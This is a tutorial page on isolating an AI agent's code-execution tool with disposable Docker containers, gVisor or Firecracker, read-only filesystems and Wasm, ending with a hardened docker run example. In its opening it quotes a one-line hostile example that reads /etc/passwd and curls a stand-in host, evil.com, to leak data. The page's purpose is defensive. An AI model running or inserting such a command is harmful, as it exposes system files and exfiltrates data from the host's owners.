Tool Sandboxing: Containerized Execution and Ephemeral Filesystems

Isolating code execution: Docker sandboxes, gVisor, WebAssembly (Wasm), read-only root filesystems, and disposable runner pools.

1Core principles of Tool Sandboxing: Containerized Execution and Ephemeral Filesystems

If an agent has a tool to run Python code (`execute_python_code(script)`), what happens if the model runs: import os; os.system("cat /etc/passwd; curl evil.com/leak")? If executed directly on your host server, your infrastructure is compromised immediately.

Key idea Isolating code execution: Docker sandboxes, gVisor, WebAssembly (Wasm), read-only root filesystems, and disposable runner pools.

2The Hardened Container Sandbox

Tool Sandboxing enforces hard isolation:

3Docker vs gVisor vs Firecracker

  • 1. Ephemeral Docker Containers: Every task executes in a fresh, disposable container that is destroyed on completion. Any files created or deleted vanish with the container!
  • 2. Sandboxed Kernels (gVisor / Firecracker): Traditional Docker containers share the host Linux kernel. Hardened sandboxes (Google gVisor or AWS Firecracker microVMs) intercept all system calls, preventing container escape exploits!
  • 3. Read-Only Root Filesystems (`--read-only`): The operating system files are completely read-only. The agent can only write to a temporary, memory-backed `/tmp` directory.
  • 4. WebAssembly (Wasm) Micro-Sandboxes: Run Python and JavaScript tools compiled to WebAssembly (Wasmtime). Wasm runs in a memory-safe sandbox with zero access to the filesystem, network, or OS unless explicitly granted!
# Launching a Hardened Docker Sandbox for Agent Code Execution:
docker run --rm -i \
    --network none \
    --read-only \
    --tmpfs /tmp:rw,noexec,nosuid,size=64m \
    --user 1000:1000 \
    --cap-drop ALL \
    --memory 256m \
    --cpus 1.0 \
    python:3.12-slim python -c "print('Isolated, secure execution!')"

The Zero-Network Sandbox Flag: For pure code execution tools that don't need the internet, always pass --network none. An agent cannot exfiltrate data if it has no network interface.
